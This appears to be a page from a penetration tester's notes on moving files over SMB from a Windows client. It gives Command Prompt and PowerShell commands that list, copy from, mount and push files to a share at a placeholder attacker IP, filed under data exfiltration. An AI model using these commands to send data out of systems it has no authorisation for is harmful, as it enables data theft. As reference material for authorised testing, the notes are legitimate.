# Client
## 01 - Command Prompt

List the files to check if the share is accessible.

```
C:\> dir \\<attacker_IP>\<share_name>
```

Copy the file from the network share.

```
C:\> copy \\<attacker_IP>\<share_name>\<source> <destination>
```

For `/mt` flag switch run the command on windows that is related about hardware information from [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Host/0xF - Operating System/Kernel/Manual/Living off the Land|system and kernel version]] phase.

```
C:\> robocopy <source> \\<IP>\<share_name>\<destination> /s /r:0 /w:0 /copy:DA /dcopy:DA /mt:<threads>
```

You can mount the share remotely.

> [!INFO] Error Message
> The message is self-explanatory. Just specify username and password on the server side and it'll work just fine.
> 
> ```
> System error 1272 has occurred.
> 
> You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
> ```

```
C:\> net.exe use \\<attacker_IP>\<share_name> [/user:<username> <password>] [/persistent:yes]

C:\> net.exe use <drive_letter>: \\<attacker_IP>\<share_name> [/user:<username> <password>] [/persistent:yes]
```

To unmount the share network.

```
C:\> net.exe use /delete \\<attacker_IP>\<share_name>

C:\> net.exe use <drive_letter>: /delete
```

## 02 - PowerShell

List the files to check if the share is accessible.

```
PS C:\> Get-ChildItem \\<attacker_IP>\<share_name>
```

Copy the file from the network share.

```
PS C:\> Copy-Item \\<attacker_IP>\<share_name>\<source> <destination>
```

You can mount the share remotely. Pass the credentials if required.

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)

New-PSDrive -Name <drive_letter> -PSProvider FileSystem -Root "\\<attacker_IP>\<share_name>" [-Credential $credential]
```

To unmount the share network.

```
PS C:\> Remove-PSDrive -Name <drive_letter>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Linux/Network Ports/SMB]]

### Chris Titus

- [Chris Titus: Robocopy](https://www.christitus.com/robocopy)